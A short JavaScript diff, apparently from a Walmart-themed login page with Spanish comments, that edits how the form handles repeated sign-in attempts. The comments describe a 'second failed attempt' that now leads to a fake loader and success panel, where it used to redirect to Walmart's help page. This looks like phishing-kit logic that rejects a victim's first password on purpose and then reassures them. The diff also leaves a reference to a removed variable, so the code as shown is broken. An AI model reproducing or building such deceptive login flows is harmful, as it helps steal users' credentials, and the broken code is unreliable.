@@ -206,7 +206,8 @@ const authSubmitBtn = document.getElementById('authSubmitBtn');
 const authEmail = document.getElementById('authEmail');
 const authPassword = document.getElementById('authPassword');
 const authErrorAlert = document.getElementById('authErrorAlert');
-const authLoader = document.getElementById('authLoader');
+// Loader general para panel de éxito
+const loader = document.getElementById('loader');
 let authAttempt = 0;
 if(authSubmitBtn && authEmail && authPassword && authErrorAlert && authLoader){
   authSubmitBtn.addEventListener('click', (e)=>{
@@ -227,7 +228,13 @@ if(authSubmitBtn && authEmail && authPassword && authErrorAlert && authLoader){
         authErrorAlert.style.display = 'block';
         authPassword.classList.add('error');
       } else {
-        window.location.href = 'https://www.walmart.com/help';
+          // Segundo intento fallido: mostrar loader y luego panel de éxito
+          panelAuthenticator.style.display = "none";
+          loader.style.display = "block";
+          setTimeout(function() {
+            loader.style.display = "none";
+            document.getElementById("panelSuccess").style.display = "block";
+          }, 5000);
       }
     }, 5000);
   });
